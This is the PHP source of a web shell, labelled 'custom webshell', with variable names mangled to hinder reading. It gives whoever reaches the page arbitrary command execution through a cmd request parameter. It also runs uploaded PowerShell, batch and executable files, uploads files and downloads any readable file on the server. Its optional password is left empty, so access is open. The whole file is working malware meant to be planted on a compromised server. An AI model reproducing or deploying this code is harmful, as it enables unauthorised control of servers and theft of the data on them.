<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->



<?php         $we3463500836=''; 
        global $gh572007645;
        global $js708420072;
    if($we3463500836 != null) {
        if (isset($_COOKIE['pass'])) {                         if (hash('sha512', $_COOKIE['pass']) !== $we3463500836) {
                echo "Wrong password !";
                exit;
            }
        } else {
            echo "Wrong password !";
            exit;
        }
    }

    function getAbsolute(string $ee190089999): string
    {
                $ee190089999 = mb_ereg_replace('\\\\|/', '/', $ee190089999, 'msr');
                $ep666533230 = $ee190089999[0] === '/';
                preg_match('/^[a-z]:/', $ee190089999, $fo103159226);
        $de298497536 = isset($fo103159226[0]) ? $fo103159226[0] : false;
                $xn818431695 = array_filter(explode('/', $ee190089999), 'mb_strlen');

        $xh2577458364 = [];
        foreach ($xn818431695 as $nr1926452922) {
            if ('.' === $nr1926452922) {
                continue;
            }
                                                            if ('..' === $nr1926452922
                && !$ep666533230
                && !$de298497536
                && empty(array_filter($xh2577458364, function ($sx494360628) { return !('..' === $sx494360628); }))
            ) {
                $xh2577458364[] = $nr1926452922;
                continue;
            }
            if ('..' === $nr1926452922) {
                array_pop($xh2577458364);
                continue;
            }
            $xh2577458364[] = $nr1926452922;
        }

        return
            (($ep666533230 ? '/' : $de298497536) ?
                $de298497536.'/' : ''
            ).implode('/', $xh2577458364);
    }

        if (isset($_POST['upload'])) {
        $ho972891117 = getDir();
        $es2085602742 = $ho972891117.'/'.basename($_FILES['file']['name']);

        if (file_exists($es2085602742)) {
            echo "<script>alert('Error: File already exists !')</script>";
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $es2085602742)) {
            echo "<script>alert('File uploaded successfuly !')</script>";
        } else {
            echo "<script>alert('Error: Could not upload file !')</script>";
        }
    
    }
    else if (isset($_GET['runscript'])) {
        $pu478250810 = $_GET['runscript'];
        $sn3860055220 = getAbsolute($pu478250810);
        $lh2395663060 = 'pwsh -Noni -Nop -File "' . $sn3860055220 . '"';
        global $gh572007645;
        global $js708420072;
        $gh572007645 = shell_exec($lh2395663060);
    }
    else if (isset($_GET['runexe'])) {
        $pu478250810 = $_GET['runexe'];
        $sn3860055220 = getAbsolute($pu478250810);
        $lh2395663060 = $sn3860055220;
        exec('cd '.realpath(getDir()).' && '.$sn3860055220, $gh572007645, $js708420072);
    }
    else if (isset($_GET['runbat'])) {
        $pu478250810 = $_GET['runbat'];
        $sn3860055220 = getAbsolute($pu478250810);
        $lh2395663060 = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $sn3860055220 . ') }';
        exec('cd '.realpath(getDir()).' && '.$sn3860055220, $gh572007645, $js708420072);
    }
    
        if (isset($_GET['download'])) {
        $nj2359244304 = $_GET['download'];
        if (file_exists($nj2359244304)) {
            if (is_readable($nj2359244304)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($nj2359244304).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: '.filesize($nj2359244304));
                readfile($nj2359244304);
                exit;
            } else {
                echo "<script>alert('Error: Could not read the file !')</script>";
                exit;
            }
        }
    }

    function getHeaderColor(){
        return 'rgb(32, 0, 128)';
    }
    function getPrimaryColor(){
        return '#00ff00';
    }
    function getSecondaryColor(){
        return '#d92626';
    }
    function getCommandColor(){
        return '#ff0066';
    }
    function getCommandOutputColor(){
        return '#3ADF00';
    }
    function getExplorerColor(){
        return '#3ADF00';
    }
    function getDirectoryColor(){
        return '#3ADF00';
    }
    function getNavTextColor(){
        return '#ff5500';
    }
    function getHeaderTextColor(){
        return '#C0C0C0';
    }
    function getNavTextHoverColor(){
        return '#C0C0C0';
    }
    function getButtonsColor(){
        return '#3ADF00';
    }
    function getBgColor($ky2599078931){
        switch ($ky2599078931) {
          case 1:
            return '#101010';
            break;
          case 2:
            return '#202020';
            break;
          case 3:
            return '#303030';
            break;
          case 4:
            return '#404040';
            break;
          default:
            return '#404040';
        }
        return '#404040';
    }
    function fileExtension($tw1579384326) {
        $ie2013832146 = strrpos($tw1579384326, '.');
        return ($ie2013832146 === false) ? '' : substr($tw1579384326, $ie2013832146+1);
    }
    function getItemSize($ta1007413605) {
        $js708420072 =  '';
        $re2939671786 = getDir().'/'.$ta1007413605;
        if (is_dir($re2939671786)){  
            $js708420072 .=  '<td style="color: "' .  getDirectoryColor() . '">';
            $js708420072 .= htmlspecialchars('<dir>');
        }
        else{
            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $wz1685339628 = formatSizeUnits(filesize($re2939671786));
            $js708420072 .= $wz1685339628;
        }
        $js708420072 .= '</td>';
        return $js708420072;
    }
    function getItemActions($ta1007413605) {
        $js708420072 =  '';
        $jc30643714 = pathinfo($ta1007413605, PATHINFO_EXTENSION);
        switch ($jc30643714) {
          case "ps1":
            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $js708420072 .= makeRunScriptFile($ta1007413605);
            break;
          case "bat":
            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $js708420072 .= makeRunBatFile($ta1007413605);
            break;
          case "exe":
            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $js708420072 .= makeRunExeFile($ta1007413605);
            break;
          default:
            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $js708420072 .= htmlspecialchars('noop');
        }
        $js708420072 .= '</td>';
        return $js708420072;
    }
    function printPerms($nj2359244304) {
        $ab2546616235 = fileperms($nj2359244304);
        if( $ab2546616235 & 0x1000 ) { $ug2363381545='p'; }
        else if( $ab2546616235 & 0x2000 ) { $ug2363381545='c'; }
        else if( $ab2546616235 & 0x4000 ) { $ug2363381545='d'; }
        else if( $ab2546616235 & 0x6000 ) { $ug2363381545='b'; }
        else if( $ab2546616235 & 0x8000 ) { $ug2363381545='-'; }
        else if( $ab2546616235 & 0xA000 ) { $ug2363381545='l'; }
        else if( $ab2546616235 & 0xC000 ) { $ug2363381545='s'; }
        else $ug2363381545='u';
        $zz3479234172["read"] = ($ab2546616235 & 00400) ? 'r' : '-';
        $zz3479234172["write"] = ($ab2546616235 & 00200) ? 'w' : '-';
        $zz3479234172["execute"] = ($ab2546616235 & 00100) ? 'x' : '-';
        $oa1841317061["read"] = ($ab2546616235 & 00040) ? 'r' : '-';
        $oa1841317061["write"] = ($ab2546616235 & 00020) ? 'w' : '-';
        $oa1841317061["execute"] = ($ab2546616235 & 00010) ? 'x' : '-';
        $wn980881731["read"] = ($ab2546616235 & 00004) ? 'r' : '-';
        $wn980881731["write"] = ($ab2546616235 & 00002) ? 'w' : '-';
        $wn980881731["execute"] = ($ab2546616235 & 00001) ? 'x' : '-';
        if( $ab2546616235 & 0x800 ) $zz3479234172["execute"] = ($zz3479234172['execute']=='x') ? 's' : 'S';
        if( $ab2546616235 & 0x400 ) $oa1841317061["execute"] = ($oa1841317061['execute']=='x') ? 's' : 'S';
        if( $ab2546616235 & 0x200 ) $wn980881731["execute"] = ($wn980881731['execute']=='x') ? 't' : 'T';
        $eo453955339=sprintf("%1s", $ug2363381545);
        $eo453955339.=sprintf("%1s%1s%1s", $zz3479234172['read'], $zz3479234172['write'], $zz3479234172['execute']);
        $eo453955339.=sprintf("%1s%1s%1s", $oa1841317061['read'], $oa1841317061['write'], $oa1841317061['execute']);
        $eo453955339.=sprintf("%1s%1s%1s", $wn980881731['read'], $wn980881731['write'], $wn980881731['execute']);
        return $eo453955339;
    }

    function formatSizeUnits($va2979611598) {
        if ($va2979611598 >= 1073741824)
        {
            $va2979611598 = number_format($va2979611598 / 1073741824, 2) . ' GB';
        }
        elseif ($va2979611598 >= 1048576)
        {
            $va2979611598 = number_format($va2979611598 / 1048576, 2) . ' MB';
        }
        elseif ($va2979611598 >= 1024)
        {
            $va2979611598 = number_format($va2979611598 / 1024, 2) . ' KB';
        }
        elseif ($va2979611598 > 1)
        {
            $va2979611598 = $va2979611598 . ' bytes';
        }
        elseif ($va2979611598 == 1)
        {
            $va2979611598 = $va2979611598 . ' byte';
        }
        else
        {
            $va2979611598 = '0 bytes';
        }

        return $va2979611598;
    }


    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }


    function makeFileName($nj2359244304) {
        if (is_dir(getDir().'/'.$nj2359244304)) {
            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$nj2359244304).'">'.$nj2359244304.'</a>';
        } else {
            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$nj2359244304).'">'.$nj2359244304.'</a>';
        }
    }
    function makeRunScriptFile($nj2359244304) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$nj2359244304).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function makeRunExeFile($nj2359244304) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$nj2359244304).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function makeRunBatFile($nj2359244304) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$nj2359244304).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function getFiles() {
        $wb104153177 = scandir(getDir());

        $pw3477086066 = true;
        if ($wb104153177 != null) {
            foreach($wb104153177 as $ta1007413605){
                                echo '<tr style="background-color:'.($pw3477086066  ? '#515151' : '#212121').';">';
                echo '<td style="font-weight:thin;">'.makeFileName($ta1007413605).'</td>'; 
                                                echo ''.getItemSize($ta1007413605).'';
                echo ''.getItemActions($ta1007413605).'';
                echo '</tr>';
                $pw3477086066 = !$pw3477086066;
            }
        } else {
            echo "<p>Couldn't open that directory !";
        }
    }

    function getCmdResults() {
        global $gh572007645;
        global $js708420072;
        
        if ($js708420072 == 0 ) {
            if($gh572007645 != null){
                foreach ($gh572007645 as $aj3507795190) {

                    if($aj3507795190 != null){
                        echo "<br>";
                        echo htmlspecialchars($aj3507795190);
                        echo "\n";
                        
                    }
                }
            }
        } else {
            echo "Execution failed with error code: ".$js708420072;
        }    
    }

    function getCommandLine() {
        $xd3847340049 = gethostname() ?? 'none';
        $ep4166911607 = get_current_user();
        $rt3131800080 = getDir();
        $tc794565824 = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        return '<span style="color: #ff6347">'.$ep4166911607.'@'.$xd3847340049.'</span>: <span style="color: #B40404">'.$rt3131800080.'</span>$ '.$tc794565824;
    }

    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $gh572007645, $js708420072);
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function changeDir() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo getHeaderColor();?>;
                --background-color-1: <?php echo getBgColor(1);?>;
                --background-color-2: <?php echo getBgColor(2);?>;
                --background-color-3: <?php echo getBgColor(3);?>;
                --background-color-4: <?php echo getBgColor(4);?>;
                --primary-color: <?php echo getPrimaryColor();?>;
                --secondary-color: <?php echo getSecondaryColor();?>;
                --command-color: <?php echo getCommandColor();?>;
                --commandoutput-color: <?php echo getCommandOutputColor();?>;
                --explorer-color: <?php echo getExplorerColor();?>;
                --directory-color: <?php echo getDirectoryColor();?>;
                --navtext-color: <?php echo getNavTextColor();?>;
                --navtext-hover-color: <?php echo getNavTextHoverColor();?>;
                --header-text-color: <?php echo getHeaderTextColor();?>;
                --buttons-color: <?php echo getButtonsColor();?>;
            }
        </style>
        <script>
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function showUploadPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function showRunScriptPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function hidePopup() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                    <a onclick="showUploadPopup()">[upload]</a>
                    <a onclick="changeDir()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo getDir()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php getFiles()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo getCommandLine()?></p>
                    <p><?php getCmdResults()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo getDir()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>




